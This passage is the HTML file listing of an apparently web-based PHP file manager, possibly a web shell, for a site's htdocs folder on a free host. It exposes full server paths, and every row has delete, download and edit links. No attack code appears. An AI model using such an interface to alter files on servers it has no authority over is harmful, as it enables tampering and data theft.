                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-skynet.php">buscador-skynet.php</a></td>
                    <td>Archivo</td>
                    <td>16.1 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-skynet.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-skynet.php::buscador-skynet.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-skynet.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-tags.php">buscador-tags.php</a></td>
                    <td>Archivo</td>
                    <td>16.01 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-tags.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-tags.php::buscador-tags.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-tags.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador.php">buscador.php</a></td>
                    <td>Archivo</td>
                    <td>19.21 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador.php::buscador.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscadordegooles.php">buscadordegooles.php</a></td>
                    <td>Archivo</td>
                    <td>7.46 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscadordegooles.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscadordegooles.php::buscadordegooles.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscadordegooles.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscadorweb.php">buscadorweb.php</a></td>
                    <td>Archivo</td>
                    <td>19.36 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscadorweb.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscadorweb.php::buscadorweb.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscadorweb.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::cambioex.php">cambioex.php</a></td>
                    <td>Archivo</td>
                    <td>1012 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/cambioex.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/cambioex.php::cambioex.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::cambioex.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::chat.php">chat.php</a></td>
                    <td>Archivo</td>
                    <td>3.27 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/chat.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/chat.php::chat.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::chat.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::chatx.php">chatx.php</a></td>
                    <td>Archivo</td>
                    <td>3.28 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/chatx.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/chatx.php::chatx.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::chatx.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::clima.php">clima.php</a></td>
                    <td>Archivo</td>
                    <td>421 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/clima.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/clima.php::clima.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::clima.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentario-borrar.php">comentario-borrar.php</a></td>
                    <td>Archivo</td>
                    <td>887 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentario-borrar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentario-borrar.php::comentario-borrar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentario-borrar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentario3.php">comentario3.php</a></td>
                    <td>Archivo</td>
                    <td>2.66 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentario3.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentario3.php::comentario3.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentario3.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentarios.php">comentarios.php</a></td>
                    <td>Archivo</td>
                    <td>1.83 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentarios.php::comentarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentarios.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::conectados.php">conectados.php</a></td>
                    <td>Archivo</td>
                    <td>3.45 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/conectados.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/conectados.php::conectados.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::conectados.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::contacto-form.php">contacto-form.php</a></td>
                    <td>Archivo</td>
                    <td>2.59 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/contacto-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/contacto-form.php::contacto-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::contacto-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::contacto.php">contacto.php</a></td>
                    <td>Archivo</td>
                    <td>1.24 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/contacto.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/contacto.php::contacto.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::contacto.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::datos_cambiar.php">datos_cambiar.php</a></td>
                    <td>Archivo</td>
                    <td>1.19 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/datos_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/datos_cambiar.php::datos_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::datos_cambiar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-form.php">denuncia-form.php</a></td>
                    <td>Archivo</td>
                    <td>2.81 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-form.php::denuncia-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-publica-form.php">denuncia-publica-form.php</a></td>
                    <td>Archivo</td>
                    <td>7.2 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-publica-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-publica-form.php::denuncia-publica-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-publica-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-publica.php">denuncia-publica.php</a></td>
                    <td>Archivo</td>
                    <td>1.15 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-publica.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-publica.php::denuncia-publica.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-publica.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia.php">denuncia.php</a></td>
                    <td>Archivo</td>
                    <td>1.12 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia.php::denuncia.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncias.php">denuncias.php</a></td>
                    <td>Archivo</td>
                    <td>6.59 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncias.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncias.php::denuncias.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncias.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::edicion.form.php">edicion.form.php</a></td>
                    <td>Archivo</td>
                    <td>14.57 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/edicion.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/edicion.form.php::edicion.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::edicion.form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::edicion.php">edicion.php</a></td>
                    <td>Archivo</td>
                    <td>1.67 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/edicion.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/edicion.php::edicion.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::edicion.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::emoticones.php">emoticones.php</a></td>
                    <td>Archivo</td>
                    <td>8.57 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/emoticones.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/emoticones.php::emoticones.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::emoticones.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::enlazanos.php">enlazanos.php</a></td>
                    <td>Archivo</td>
                    <td>2.85 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/enlazanos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/enlazanos.php::enlazanos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::enlazanos.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos-borrar2.php">favoritos-borrar2.php</a></td>
                    <td>Archivo</td>
                    <td>218 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos-borrar2.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos-borrar2.php::favoritos-borrar2.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos-borrar2.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos.php">favoritos.php</a></td>
                    <td>Archivo</td>
                    <td>4.77 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos.php::favoritos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos.post.add.php">favoritos.post.add.php</a></td>
                    <td>Archivo</td>
                    <td>810 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos.post.add.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos.post.add.php::favoritos.post.add.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos.post.add.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::header.php">header.php</a></td>
                    <td>Archivo</td>
                    <td>34.82 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/header.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/header.php::header.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::header.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::home.php">home.php</a></td>
                    <td>Archivo</td>
                    <td>1.22 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/home.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/home.php::home.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::home.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::index.php">index.php</a></td>
                    <td>Archivo</td>
                    <td>15.42 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/index.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/index.php::index.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::index.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
